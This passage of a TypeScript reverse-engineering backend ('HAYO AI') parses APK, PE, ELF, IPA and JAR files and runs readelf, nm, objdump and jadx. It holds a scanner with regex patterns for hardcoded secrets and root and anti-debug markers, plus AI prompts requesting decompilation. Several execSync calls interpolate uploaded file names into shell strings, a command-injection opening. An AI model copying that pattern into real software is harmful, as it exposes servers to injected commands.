      const packageName = strings.find(s => s.includes(".") && !s.includes(" ") && s.length > 5 && s.length < 80);
      const permissions = strings.filter(s => s.startsWith("android.permission."));
      return {
        packageName: packageName || "غير محدد (Binary XML)",
        permissions,
        note: "تم استخراج المعلومات من Binary XML",
      };
    } catch {
      return { note: "فشل تحليل Manifest" };
    }
  }
}

function extractUTF16Strings(buf: Buffer): string[] {
  const strings: string[] = [];
  let current = "";
  for (let i = 0; i < buf.length - 1; i += 2) {
    const char = buf.readUInt16LE(i);
    if (char >= 32 && char < 127) {
      current += String.fromCharCode(char);
    } else {
      if (current.length >= 4) strings.push(current);
      current = "";
    }
  }
  if (current.length >= 4) strings.push(current);
  return strings;
}

function parsePEBasic(buf: Buffer): any {
  try {
    if (buf[0] !== 0x4D || buf[1] !== 0x5A) {
      return { error: "ليس ملف EXE صالح (لا يحتوي MZ header)" };
    }
    const peOffset = buf.readUInt32LE(0x3C);
    if (buf.readUInt32LE(peOffset) !== 0x00004550) {
      return { error: "PE signature غير صالح" };
    }
    const machine = buf.readUInt16LE(peOffset + 4);
    const machineTypes: Record<number, string> = {
      0x014C: "x86 (32-bit)", 0x8664: "x64 (64-bit)",
      0xAA64: "ARM64", 0x01C0: "ARM",
    };
    const numSections = buf.readUInt16LE(peOffset + 6);
    const timestamp = buf.readUInt32LE(peOffset + 8);
    const compileDate = new Date(timestamp * 1000).toISOString().split("T")[0];
    const characteristics = buf.readUInt16LE(peOffset + 22);
    const isDLL = !!(characteristics & 0x2000);
    return {
      architecture: machineTypes[machine] || `Unknown (0x${machine.toString(16)})`,
      sections: numSections,
      compileDate,
      isDLL,
      type: isDLL ? "DLL (مكتبة)" : "EXE (تطبيق)",
    };
  } catch (err: any) {
    return { error: `فشل تحليل PE: ${err.message}` };
  }
}

function detectDotNet(buf: Buffer): boolean {
  const str = buf.toString("ascii", 0, Math.min(buf.length, 1_000_000));
  return str.includes("mscoree.dll") || str.includes("_CorExeMain") || str.includes("System.Runtime");
}

function extractStrings(buf: Buffer, minLength = 6): string[] {
  const strings: string[] = [];
  let current = "";
  for (let i = 0; i < buf.length; i++) {
    const byte = buf[i];
    if (byte >= 32 && byte < 127) {
      current += String.fromCharCode(byte);
    } else {
      if (current.length >= minLength && !strings.includes(current) && !/^[.\-_=]+$/.test(current)) {
        strings.push(current);
      }
      current = "";
    }
  }
  if (current.length >= minLength && !strings.includes(current)) strings.push(current);
  return strings
    .sort((a, b) => {
      const score = (s: string) => (s.includes("http") ? 100 : 0) + (s.includes("api") ? 50 : 0) + (s.includes("key") ? 50 : 0);
      return score(b) - score(a);
    })
    .slice(0, 5000);
}

export function readDirRecursive(dir: string): string[] {
  const results: string[] = [];
  try {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) results.push(...readDirRecursive(full));
      else results.push(full);
    }
  } catch { /* skip */ }
  return results;
}

function buildFileTree(files: DecompiledFile[]): FileTreeNode[] {
  const root: Record<string, any> = {};
  for (const file of files) {
    const parts = file.path.split("/");
    let current = root;
    for (let i = 0; i < parts.length; i++) {
      const part = parts[i];
      if (i === parts.length - 1) {
        if (!current._files) current._files = [];
        current._files.push({ name: part, path: file.path, type: "file" as const, size: file.size });
      } else {
        if (!current[part]) current[part] = {};
        current = current[part];
      }
    }
  }

  function convert(obj: Record<string, any>, _prefix = ""): FileTreeNode[] {
    const nodes: FileTreeNode[] = [];
    for (const [key, value] of Object.entries(obj)) {
      if (key === "_files") continue;
      nodes.push({ name: key, path: key, type: "folder", children: convert(value, key) });
    }
    if (obj._files) nodes.push(...obj._files);
    return nodes;
  }
  return convert(root);
}

function generateAPKReport(fileName: string, files: DecompiledFile[], manifest: any, jadxSuccess: boolean): string {
  return [
    `══════════════════════════════════════`,
    `  تقرير الهندسة العكسية — HAYO AI`,
    `══════════════════════════════════════`,
    ``,
    `الملف: ${fileName}`,
    `التاريخ: ${new Date().toLocaleString("ar-SA")}`,
    `عدد الملفات المستخرجة: ${files.length}`,
    `تفكيك Java/Kotlin: ${jadxSuccess ? "✅ ناجح" : "❌ غير متاح (JADX غير مثبت)"}`,
    ``,
    manifest ? `══ معلومات التطبيق ══` : "",
    manifest?.packageName ? `اسم الحزمة: ${manifest.packageName}` : "",
    manifest?.versionName ? `الإصدار: ${manifest.versionName}` : "",
    manifest?.permissions?.length ? `\nالصلاحيات (${manifest.permissions.length}):` : "",
    ...(manifest?.permissions || []).map((p: string) => `  • ${p}`),
    ``,
    `══ أنواع الملفات ══`,
    `ملفات كود: ${files.filter(f => [".java", ".kt", ".smali", ".js"].includes(f.extension)).length}`,
    `ملفات موارد: ${files.filter(f => f.path.startsWith("res/")).length}`,
    `ملفات أصول: ${files.filter(f => f.path.startsWith("assets/")).length}`,
    `مكتبات أصلية: ${files.filter(f => f.extension === ".so").length}`,
    ``,
    `══ تم بواسطة HAYO AI ══`,
  ].filter(l => l !== undefined).join("\n");
}

function formatBytes(bytes: number): string {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
  return (bytes / (1024 * 1024)).toFixed(1) + " MB";
}

function cleanupDir(dir: string) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
}

// ════════════════════════════════════════
// Vulnerability Scanner
// ════════════════════════════════════════

export function scanVulnerabilities(
  files: DecompiledFile[],
  fileType: string,
  extraStrings: string[] = []
): VulnerabilityFinding[] {
  const findings: VulnerabilityFinding[] = [];
  const allContent = files.map(f => f.content || "").join("\n");
  const allStrings = [...extraStrings, ...allContent.split("\n")].filter(Boolean);

  // 1. Hardcoded credentials
  const credEvidence: string[] = [];
  const credPatterns = [
    /(?:password|passwd|pwd)\s*[=:]\s*["']([^"']{8,})["']/gi,
    /(?:api[_\-]?key|apikey|api_secret)\s*[=:]\s*["']([^"']{10,})["']/gi,
    /(?:secret|token|access_key)\s*[=:]\s*["']([A-Za-z0-9+/]{20,})["']/gi,
  ];
  for (const p of credPatterns) {
    const m = allContent.match(p) || [];
    credEvidence.push(...m.slice(0, 3).map(s => s.replace(/"[^"]{8,}"/, '"[REDACTED]"')));
  }
  if (credEvidence.length > 0) {
    findings.push({ severity: "critical", category: "Information Disclosure", title: "بيانات اعتماد مضمّنة في الكود", description: "تم اكتشاف كلمات مرور أو مفاتيح API مضمّنة في الكود.", evidence: credEvidence.slice(0, 5) });
  }

  // 2. HTTP URLs
  const httpUrls = allStrings.filter(s => /^http:\/\/[a-z]/.test(s) && s.length > 12).slice(0, 8);
  if (httpUrls.length > 0) {
    findings.push({ severity: "medium", category: "Insecure Communication", title: "اتصالات HTTP غير مشفرة", description: "تم اكتشاف روابط HTTP — يجب استخدام HTTPS لتشفير الاتصالات.", evidence: httpUrls.slice(0, 5) });
  }

  // 3. Debug build
  const debugHints = allStrings.filter(s => /android:debuggable="true"|BuildConfig\.DEBUG\s*=\s*true|debuggable.*=.*true/i.test(s)).slice(0, 3);
  if (debugHints.length > 0 || allContent.includes('android:debuggable="true"')) {
    findings.push({ severity: "high", category: "Debug Configuration", title: "وضع Debug مفعّل في التطبيق", description: "يسهل وضع Debug اختراق التطبيق وتحليله.", evidence: debugHints });
  }

  // 4. Weak crypto
  const weakCrypto = allStrings.filter(s => /\b(MD5|SHA1|DES\b|RC4|ECB)\b/i.test(s)).slice(0, 5);
  if (weakCrypto.length > 0) {
    findings.push({ severity: "high", category: "Weak Cryptography", title: "خوارزميات تشفير ضعيفة", description: "اكتشاف MD5/SHA1/DES/RC4 — هذه الخوارزميات مكسورة أو ضعيفة أمنياً.", evidence: weakCrypto });
  }

  // 5. SQL Injection
  const sqlRisk = allStrings.filter(s => /rawQuery|execSQL\(.*\+|WHERE.*\+.*=/.test(s)).slice(0, 4);
  if (sqlRisk.length > 0) {
    findings.push({ severity: "high", category: "SQL Injection Risk", title: "خطر SQL Injection", description: "استخدام بناء SQL ديناميكي غير آمن.", evidence: sqlRisk.slice(0, 3) });
  }

  // 6. SSL Pinning check
  const hasPinning = allStrings.some(s => /CertificatePinner|TrustKit|ssl_pinning|checkServerTrusted|CertificateChain/i.test(s));
  findings.push({ severity: "info", category: "SSL/TLS Security", title: hasPinning ? "✅ SSL Pinning مفعّل" : "⚠️ SSL Pinning غير موجود", description: hasPinning ? "التطبيق يستخدم Certificate Pinning لمنع MITM attacks." : "لا يوجد Certificate Pinning — التطبيق قد يكون عرضة لهجمات MITM.", evidence: [] });

  // 7. Root/Jailbreak detection
  const hasRootDetect = allStrings.some(s => /isRooted|su\b|Superuser|RootBeer|checkRootBeer|isJailbroken|jailbreak/i.test(s));
  findings.push({ severity: "info", category: "Device Integrity", title: hasRootDetect ? "✅ كشف Root/Jailbreak موجود" : "⚠️ لا يوجد كشف للـ Root/Jailbreak", description: hasRootDetect ? "التطبيق يحاول اكتشاف الأجهزة المعدَّلة." : "التطبيق لا يتحقق من سلامة الجهاز.", evidence: [] });

  // 8. Anti-debugging
  const hasAntiDebug = allStrings.some(s => /isDebuggerConnected|TracerPid|ptrace|SIGKILL|DEBUG_FLAG/i.test(s));
  if (!hasAntiDebug && (fileType === "apk" || fileType === "exe")) {
    findings.push({ severity: "low", category: "Anti-Debugging", title: "لا يوجد حماية من Debugger", description: "لم يتم اكتشاف آليات منع الـ debugging.", evidence: [] });
  }

  // 9. Exposed components (APK)
  if (fileType === "apk") {
    const exported = (allContent.match(/android:exported="true"/g) || []).length;
    if (exported > 3) {
      findings.push({ severity: "medium", category: "Exposed Components", title: `${exported} مكوّن مُصدَّر`, description: "عدد كبير من المكونات مُصدَّرة ومتاحة لتطبيقات أخرى.", evidence: [`android:exported="true" تكررت ${exported} مرة`] });
    }
  }

  // 10. Obfuscation detection
  const hasObfuscation = allStrings.some(s => /^[a-z]{1,2}$/.test(s)) || allContent.includes("ProGuard") || allContent.includes("R8");
  findings.push({ severity: "info", category: "Code Protection", title: hasObfuscation ? "✅ التطبيق مُشفَّر (Obfuscated)" : "ℹ️ لا يوجد تشفير واضح", description: hasObfuscation ? "يستخدم التطبيق ProGuard/R8 أو تشفير مشابه." : "الكود غير مُشفَّر مما يسهل الهندسة العكسية.", evidence: [] });

  return findings;
}

// ════════════════════════════════════════
// PE Enhanced — Import & Export Table Parser
// ════════════════════════════════════════

interface PEImportedDLL { name: string; functions: string[]; }

function parsePEImports(buf: Buffer): { imports: PEImportedDLL[]; exports: string[] } {
  const imports: PEImportedDLL[] = [];
  const exports: string[] = [];
  try {
    if (buf.length < 0x40 || buf[0] !== 0x4d || buf[1] !== 0x5a) return { imports, exports };
    const peOffset = buf.readUInt32LE(0x3c);
    if (buf.length < peOffset + 24 || buf.readUInt32LE(peOffset) !== 0x00004550) return { imports, exports };
    const machine = buf.readUInt16LE(peOffset + 4);
    const is64 = machine === 0x8664;
    const numSections = buf.readUInt16LE(peOffset + 6);
    const optHdrOffset = peOffset + 24;
    const optHdrSize = buf.readUInt16LE(peOffset + 20);
    const sectionTableOffset = optHdrOffset + optHdrSize;

    interface PESection { va: number; rawOffset: number; size: number; }
    const sections: PESection[] = [];
    for (let i = 0; i < Math.min(numSections, 96); i++) {
      const so = sectionTableOffset + i * 40;
      if (so + 40 > buf.length) break;
      sections.push({ va: buf.readUInt32LE(so + 12), size: Math.max(buf.readUInt32LE(so + 16), buf.readUInt32LE(so + 20)), rawOffset: buf.readUInt32LE(so + 20) });
    }

    const rva2off = (rva: number): number => {
      for (const s of sections) {
        if (rva >= s.va && rva < s.va + s.size + 0x1000) {
          const off = rva - s.va + s.rawOffset;
          return off > 0 && off < buf.length ? off : 0;
        }
      }
      return 0;
    };
    const readStr = (off: number, max = 256): string => {
      if (off <= 0 || off >= buf.length) return "";
      let end = off;
      while (end < buf.length && end < off + max && buf[end] !== 0) end++;
      return buf.slice(off, end).toString("ascii").replace(/[^\x20-\x7e]/g, "");
    };

    // Import table (data directory entry 1)
    const impBaseOff = is64 ? optHdrOffset + 0x78 + 8 : optHdrOffset + 0x68 + 8;
    if (impBaseOff + 4 <= buf.length) {
      const impDirVA = buf.readUInt32LE(impBaseOff);
      if (impDirVA) {
        let idt = rva2off(impDirVA);
        let cnt = 0;
        while (idt > 0 && idt + 20 <= buf.length && cnt < 256) {
          const iltVA = buf.readUInt32LE(idt);
          const nameVA = buf.readUInt32LE(idt + 12);
          if (!iltVA && !nameVA) break;
          const dllName = readStr(rva2off(nameVA)).toLowerCase();
          if (dllName && /^[\w.\-]+$/.test(dllName)) {
            const funcs: string[] = [];
            let thunkOff = rva2off(iltVA || buf.readUInt32LE(idt + 16));
            let fc = 0;
            while (thunkOff > 0 && fc < 80) {
              const thunk = is64 && thunkOff + 8 <= buf.length ? buf.readBigUInt64LE(thunkOff) : BigInt(thunkOff + 4 <= buf.length ? buf.readUInt32LE(thunkOff) : 0);
              if (thunk === 0n) break;
              const highBit = is64 ? 0x8000000000000000n : 0x80000000n;
              if ((thunk & highBit) === 0n) {
                const fn = readStr(rva2off(Number(thunk)) + 2, 128);
                if (fn && /^[A-Za-z_][A-Za-z0-9_@?.$]*$/.test(fn)) funcs.push(fn);
              } else {
                funcs.push(`Ord#${Number(thunk & 0xffffn)}`);
              }
              thunkOff += is64 ? 8 : 4;
              fc++;
            }
            imports.push({ name: dllName, functions: funcs.slice(0, 50) });
          }
          idt += 20; cnt++;
        }
      }
    }

    // Export table (data directory entry 0)
    const expBaseOff = is64 ? optHdrOffset + 0x78 : optHdrOffset + 0x68;
    if (expBaseOff + 4 <= buf.length) {
      const expDirVA = buf.readUInt32LE(expBaseOff);
      if (expDirVA) {
        const expDir = rva2off(expDirVA);
        if (expDir > 0 && expDir + 40 <= buf.length) {
          const numNames = buf.readUInt32LE(expDir + 24);
          const namesPtrVA = buf.readUInt32LE(expDir + 32);
          const namesPtr = rva2off(namesPtrVA);
          for (let i = 0; i < Math.min(numNames, 500); i++) {
            const off = namesPtr + i * 4;
            if (off + 4 > buf.length) break;
            const fn = readStr(rva2off(buf.readUInt32LE(off)));
            if (fn && /^[A-Za-z_]/.test(fn)) exports.push(fn);
          }
        }
      }
    }
  } catch { /* ignore */ }
  return { imports, exports };
}

// ════════════════════════════════════════
// ELF Analysis (Linux .so / Android NDK / Native Executables)
// ════════════════════════════════════════

function parseELFBasic(buf: Buffer): Record<string, string> {
  try {
    if (buf.length < 64 || !(buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46))
      return { error: "ليس ملف ELF صالح" };
    const cls = buf[4] === 1 ? "32-bit" : buf[4] === 2 ? "64-bit" : "Unknown";
    const endian = buf[5] === 1 ? "Little Endian" : "Big Endian";
    const typeMap: Record<number, string> = { 1: "Relocatable", 2: "Executable", 3: "Shared Object (.so)", 4: "Core Dump" };
    const machMap: Record<number, string> = { 3: "x86 (i386)", 8: "MIPS", 20: "PowerPC", 40: "ARM (32-bit)", 62: "x86-64 (AMD64)", 183: "ARM64 (AArch64)", 243: "RISC-V" };
    const t = buf.readUInt16LE(16), m = buf.readUInt16LE(18);
    return { class: cls, endianness: endian, type: typeMap[t] || `0x${t.toString(16)}`, machine: machMap[m] || `0x${m.toString(16)}` };
  } catch { return { error: "فشل تحليل ELF" }; }
}

export async function analyzeELF(elfBuffer: Buffer, fileName: string): Promise<DecompileResult> {
  const tmpDir = path.join(os.tmpdir(), `hayo-elf-${Date.now()}`);
  const elfPath = path.join(tmpDir, fileName);
  try {
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(elfPath, elfBuffer);
    const files: DecompiledFile[] = [];
    const elfInfo = parseELFBasic(elfBuffer);

    files.push({ path: "analysis/elf-info.json", name: "elf-info.json", extension: ".json", size: 0, content: JSON.stringify(elfInfo, null, 2), isBinary: false });

    // readelf full headers
    let readelfOut = "";
    try { readelfOut = execSync(`readelf -h -S -d "${elfPath}" 2>&1`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 }).toString(); } catch (e: any) { readelfOut = `readelf error: ${e.message}`; }
    if (readelfOut) files.push({ path: "analysis/readelf-headers.txt", name: "readelf-headers.txt", extension: ".txt", size: readelfOut.length, content: readelfOut.substring(0, 100000), isBinary: false });

    // Dynamic symbols
    let nmOut = "";
    try { nmOut = execSync(`nm -D "${elfPath}" 2>&1`, { timeout: 15000, maxBuffer: 10 * 1024 * 1024 }).toString(); } catch { /* skip */ }
    if (nmOut) files.push({ path: "analysis/dynamic-symbols.txt", name: "dynamic-symbols.txt", extension: ".txt", size: nmOut.length, content: nmOut.substring(0, 100000), isBinary: false });

    // All symbols (readelf -Ws)
    let allSymbols = "";
    try { allSymbols = execSync(`readelf -Ws "${elfPath}" 2>&1`, { timeout: 15000, maxBuffer: 10 * 1024 * 1024 }).toString(); } catch { /* skip */ }
    if (allSymbols) files.push({ path: "analysis/all-symbols.txt", name: "all-symbols.txt", extension: ".txt", size: allSymbols.length, content: allSymbols.substring(0, 100000), isBinary: false });

    // Strings with system tool
    let stringsOut = "";
    try { stringsOut = execSync(`strings -n 6 "${elfPath}"`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 }).toString(); } catch { stringsOut = extractStrings(elfBuffer).join("\n"); }
    if (stringsOut) files.push({ path: "analysis/strings.txt", name: "strings.txt", extension: ".txt", size: stringsOut.length, content: stringsOut.substring(0, 200000), isBinary: false });

    const fullDisasm = runObjdump(elfPath, 500000);
    if (fullDisasm) {
      files.push({ path: "analysis/disassembly-full.asm", name: "disassembly-full.asm", extension: ".asm", size: fullDisasm.length, content: fullDisasm, isBinary: false });
      const preview = fullDisasm.substring(0, 15000);
      files.push({ path: "analysis/disassembly-preview.asm", name: "disassembly-preview.asm", extension: ".asm", size: preview.length, content: preview, isBinary: false });
    }

    // JNI function detection
    const jniLines = (nmOut + "\n" + allSymbols).split("\n").filter(l => l.includes("Java_") && l.trim()).map(l => l.trim());
    if (jniLines.length > 0) {
      const jniContent = "# دوال JNI المكتشفة (Java Native Interface)\n\n" + jniLines.slice(0, 200).join("\n");
      files.push({ path: "analysis/jni-functions.txt", name: "jni-functions.txt", extension: ".txt", size: jniContent.length, content: jniContent, isBinary: false });
    }

    // Security scan
    const allStringsArr = stringsOut.split("\n").filter(s => s.trim().length >= 6).slice(0, 500);
    const vulnerabilities = scanVulnerabilities(files, "elf", allStringsArr);

    // AI Power Analysis
    let aiModelUsed = "";
    try {
      const sysPrompt = `أنت خبير متخصص في هندسة عكسية لملفات ELF (Linux Shared Objects وAndroid NDK Libraries وLinux Executables).
خبرتك الشاملة: ARM64/x86/MIPS assembly، JNI Android NDK، anti-debugging، certificate pinning، obfuscation، LLVM/GCC patterns.
مهمتك التحليل العميق:
1. معلومات ELF Header (class، machine، type، entry point)
2. الأقسام المهمة (.text، .data، .rodata، .dynamic، .plt، .got)
3. الدوال المُصدَّرة (خاصة JNI: Java_PackageName_ClassName_MethodName)
4. المكتبات المعتمدة (DT_NEEDED dependencies)
5. النصوص والثوابت وما تدل عليه
6. تقنيات الحماية المكتشفة
7. كود C/C++ شبه مُعاد بناؤه للدوال الرئيسية
8. توصيات للهندسة العكسية
اكتب بالعربية مع الكود بالإنجليزية.`;

      const usrMsg = `## الملف: ${fileName} (${formatBytes(elfBuffer.length)})
## ELF Info:
\`\`\`json
${JSON.stringify(elfInfo, null, 2)}
\`\`\`
## readelf Output:
\`\`\`
${readelfOut.substring(0, 4000)}
\`\`\`
## Dynamic Symbols (nm -D):
\`\`\`
${nmOut.substring(0, 2000)}
\`\`\`
## JNI Functions (${jniLines.length}):
\`\`\`
${jniLines.slice(0, 50).join("\n") || "لم يُكتشف أي دالة JNI"}
\`\`\`
## Strings (${allStringsArr.length}):
\`\`\`
${allStringsArr.join("\n")}
\`\`\`
## Hex Dump (أول 80KB):
\`\`\`
${generateHexDump(elfBuffer, 80_000)}
\`\`\``;

      const { content: aiContent, modelUsed } = await callPowerAI(sysPrompt, usrMsg, 16000);
      aiModelUsed = modelUsed;
      if (aiContent) {
        files.push({ path: "ai-decompile/ai-elf-analysis.md", name: "ai-elf-analysis.md", extension: ".md", size: aiContent.length, content: `# تحليل AI العميق (${modelUsed})\n# الملف: ${fileName}\n\n` + aiContent, isBinary: false });
      }
    } catch (e: any) { console.warn("[analyzeELF] AI failed:", e.message); }

    cleanupDir(tmpDir);
    const outputZip = new JSZip();
    for (const f of files) { if (f.content) outputZip.file(f.path, f.content); }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true, fileType: "exe", totalFiles: files.length, totalSize: elfBuffer.length,
      structure: buildFileTree(files),
      files: files.map(f => ({ ...f, content: f.content?.substring(0, 50000) })),
      metadata: { format: "ELF (Linux/Android Native Library)", originalSize: formatBytes(elfBuffer.length), fileName, elfClass: elfInfo.class, machine: elfInfo.machine, elfType: elfInfo.type, jniFunctions: jniLines.length, aiModelUsed },
      zipBuffer, analysisAvailable: true, vulnerabilities,
    };
  } catch (err: any) {
    cleanupDir(tmpDir);
    return { success: false, fileType: "exe", totalFiles: 0, totalSize: 0, structure: [], files: [], error: `فشل تحليل ELF: ${err.message}`, analysisAvailable: false };
  }
}

// ════════════════════════════════════════
// IPA Analysis (iOS Apps)
// ════════════════════════════════════════

function parseInfoPlist(content: string): Record<string, string> {
  const info: Record<string, string> = {};
  try {
    const pairs = content.match(/<key>([\s\S]*?)<\/key>\s*<(?:string|integer|real)>([\s\S]*?)<\/(?:string|integer|real)>/g) || [];
    for (const p of pairs.slice(0, 80)) {
      const k = p.match(/<key>([\s\S]*?)<\/key>/)?.[1]?.trim();
      const v = p.match(/<(?:string|integer|real)>([\s\S]*?)<\/(?:string|integer|real)>/)?.[1]?.trim();
      if (k && v) info[k] = v;
    }
    const trues = content.match(/<key>([\s\S]*?)<\/key>\s*<true\/>/g) || [];
    for (const t of trues.slice(0, 30)) {
      const k = t.match(/<key>([\s\S]*?)<\/key>/)?.[1]?.trim();
      if (k) info[k] = "true";
    }
  } catch { /* skip */ }
  return info;
}

export async function analyzeIPA(ipaBuffer: Buffer, fileName: string): Promise<DecompileResult> {
  try {
    const files: DecompiledFile[] = [];
    const zip = await JSZip.loadAsync(ipaBuffer);
    let plistContent = "", mainBinaryName = "";
    let plistInfo: Record<string, string> = {};
    const frameworks: string[] = [], permissions: string[] = [];
    const allEntries = Object.keys(zip.files);

    for (const [entryName, entry] of Object.entries(zip.files)) {
      if (entry.dir) continue;
      // Info.plist
      if (entryName.match(/Payload\/[^/]+\.app\/Info\.plist$/i)) {
        plistContent = await entry.async("text");
        plistInfo = parseInfoPlist(plistContent);
        mainBinaryName = plistInfo["CFBundleExecutable"] || "";
        files.push({ path: "ios/Info.plist", name: "Info.plist", extension: ".plist", size: plistContent.length, content: plistContent.substring(0, 50000), isBinary: false });
      }
      // Entitlements
      if (entryName.endsWith(".entitlements")) {
        const data = await entry.async("text");
        files.push({ path: "ios/entitlements.plist", name: "entitlements.plist", extension: ".plist", size: data.length, content: data, isBinary: false });
      }
      // Embedded config files (Cordova/Ionic/React Native)
      if (entryName.match(/\.(js|json|config|xml|html)$/) && !entry.dir) {
        const data = await entry.async("uint8array");
        if (data.length < 200000) {
          const text = new TextDecoder("utf-8", { fatal: false }).decode(data);
          const relPath = entryName.replace(/^Payload\/[^/]+\.app\//, "app-content/");
          files.push({ path: relPath, name: path.basename(entryName), extension: path.extname(entryName), size: data.length, content: text.substring(0, 50000), isBinary: false });
        }
      }
      // Frameworks
      if (entryName.includes("/Frameworks/") && entryName.endsWith(".dylib")) {
        const fw = entryName.split("/Frameworks/")[1]?.split("/")[0];
        if (fw && !frameworks.includes(fw)) frameworks.push(fw);
      }
    }

    // Permissions
    for (const k of Object.keys(plistInfo)) {
      if (k.startsWith("NS") && k.endsWith("UsageDescription")) permissions.push(k);
    }

    files.push({ path: "ios/file-listing.txt", name: "file-listing.txt", extension: ".txt", size: 0, content: allEntries.join("\n"), isBinary: false });

    const summary = [
      `# تحليل iOS App (IPA) — ${fileName}`, ``,
      `## هوية التطبيق`,
      `الاسم: ${plistInfo["CFBundleName"] || plistInfo["CFBundleDisplayName"] || "غير معروف"}`,
      `Bundle ID: ${plistInfo["CFBundleIdentifier"] || "غير معروف"}`,
      `الإصدار: ${plistInfo["CFBundleShortVersionString"] || "غير معروف"} (Build: ${plistInfo["CFBundleVersion"] || "?"})`,
      `الملف التنفيذي: ${mainBinaryName || "غير معروف"}`,
      `iOS Minimum: ${plistInfo["MinimumOSVersion"] || "غير معروف"}`,
      ``, `## الصلاحيات (${permissions.length}):`,
      ...permissions.map(p => `- ${p}: ${plistInfo[p]}`),
      ``, `## الأطر (Frameworks) — ${frameworks.length}:`,
      ...frameworks.slice(0, 30).map(f => `- ${f}`),
      ``, `## إحصائيات`,
      `إجمالي الملفات: ${allEntries.length}`,
      `ملفات JS: ${allEntries.filter(e => e.endsWith(".js")).length}`,
    ].join("\n");
    files.push({ path: "ios/app-summary.md", name: "app-summary.md", extension: ".md", size: summary.length, content: summary, isBinary: false });

    const vulnerabilities = scanVulnerabilities(files, "ios", permissions);
    let aiModelUsed = "";

    try {
      const sysPrompt = `أنت خبير في هندسة عكسية لتطبيقات iOS.
خبرتك: Mach-O binary، iOS security، App Store distribution، entitlements، permissions، Objective-C/Swift.
مهمتك التحليل الشامل:
1. هوية التطبيق وبنيته التقنية
2. الصلاحيات والـ entitlements وتأثيرها على الخصوصية
3. الأطر المستخدمة ووظيفتها
4. تحليل أمني (SSL pinning، jailbreak detection، data storage)
5. طبيعة التطبيق (native/hybrid/React Native/Cordova)
6. توصيات للهندسة العكسية (Frida، Ghidra، class-dump، Hopper Disassembler)
اكتب بالعربية.`;

      const usrMsg = `## ${fileName} (${formatBytes(ipaBuffer.length)})
## Parsed Info.plist:
\`\`\`json
${JSON.stringify(plistInfo, null, 2).substring(0, 3000)}
\`\`\`
## الصلاحيات: ${permissions.join(", ")}
## الأطر: ${frameworks.slice(0, 20).join(", ")}
## ملفات المحتوى (JS/JSON): ${allEntries.filter(e => e.endsWith(".js") || e.endsWith(".json")).slice(0, 30).join(", ")}
## قائمة الملفات (أول 150):
${allEntries.slice(0, 150).join("\n")}`;

      const { content: aiContent, modelUsed } = await callPowerAI(sysPrompt, usrMsg, 12000);
      aiModelUsed = modelUsed;
      if (aiContent) files.push({ path: "ai-decompile/ai-ios-analysis.md", name: "ai-ios-analysis.md", extension: ".md", size: aiContent.length, content: `# تحليل iOS AI (${modelUsed})\n\n` + aiContent, isBinary: false });
    } catch (e: any) { console.warn("[analyzeIPA] AI:", e.message); }

    const outputZip = new JSZip();
    for (const f of files) { if (f.content) outputZip.file(f.path, f.content); }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true, fileType: "apk", totalFiles: files.length, totalSize: ipaBuffer.length,
      structure: buildFileTree(files),
      files: files.map(f => ({ ...f, content: f.content?.substring(0, 50000) })),
      manifest: { packageName: plistInfo["CFBundleIdentifier"], versionName: plistInfo["CFBundleShortVersionString"], permissions },
      metadata: { format: "IPA (iOS App)", originalSize: formatBytes(ipaBuffer.length), appName: plistInfo["CFBundleName"] || plistInfo["CFBundleDisplayName"], bundleId: plistInfo["CFBundleIdentifier"], version: plistInfo["CFBundleShortVersionString"], mainBinary: mainBinaryName, frameworks: frameworks.length, permissions: permissions.length, totalFiles: allEntries.length, aiModelUsed },
      zipBuffer, analysisAvailable: true, vulnerabilities,
    };
  } catch (err: any) {
    return { success: false, fileType: "apk", totalFiles: 0, totalSize: 0, structure: [], files: [], error: `فشل تحليل IPA: ${err.message}`, analysisAvailable: false };
  }
}

// ════════════════════════════════════════
// JAR / AAR Analysis (Java Archives)
// ════════════════════════════════════════

export async function analyzeJAR(jarBuffer: Buffer, fileName: string, fileExt = "jar"): Promise<DecompileResult> {
  const tmpDir = path.join(os.tmpdir(), `hayo-jar-${Date.now()}`);
  const jarPath = path.join(tmpDir, fileName);
  const javaOutputDir = path.join(tmpDir, "java-source");
  try {
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(jarPath, jarBuffer);
    const files: DecompiledFile[] = [];
    let jadxSuccess = false;

    const jadxBin = findJadx();

    if (jadxBin) {
      fs.mkdirSync(javaOutputDir, { recursive: true });
      try {
        execSync(`"${jadxBin}" --no-res --output-dir "${javaOutputDir}" "${jarPath}"`, { timeout: 300000, stdio: "pipe" });
        jadxSuccess = true;
        for (const jf of readDirRecursive(javaOutputDir)) {
          const relPath = path.relative(javaOutputDir, jf);
          const ext = path.extname(jf).toLowerCase();
          let content: string | undefined;
          try { const s = fs.statSync(jf); if (s.size < 2000000) content = fs.readFileSync(jf, "utf-8"); } catch { }
          files.push({ path: `java-source/${relPath}`, name: path.basename(jf), extension: ext, size: fs.existsSync(jf) ? (fs.statSync(jf).size) : 0, content, isBinary: false });
        }
      } catch (e: any) { console.warn("[analyzeJAR] JADX:", e.message); }
    }

    // ZIP extraction for manifest and resources
    try {
      const zip = await JSZip.loadAsync(jarBuffer);
      const textExts = new Set([".java", ".kt", ".xml", ".json", ".properties", ".txt", ".gradle", ".mf", ".sf", ".yml", ".yaml"]);
      for (const [entryName, entry] of Object.entries(zip.files)) {
        if (entry.dir) continue;
        const ext = path.extname(entryName).toLowerCase();
        if (jadxSuccess && ext === ".class") continue; // already have java source
        const isText = textExts.has(ext);
        let content: string | undefined;
        if (isText) { try { const d = await entry.async("uint8array"); if (d.length < 200000) content = new TextDecoder("utf-8", { fatal: false }).decode(d); } catch { } }
        else if (ext === ".class") { content = `[Java bytecode — ${entryName}]`; }
        const data = await entry.async("uint8array");
        if (!files.some(f => f.path === entryName)) files.push({ path: entryName, name: path.basename(entryName), extension: ext, size: data.length, content, isBinary: !isText && ext !== ".class" });
      }
    } catch { /* skip */ }

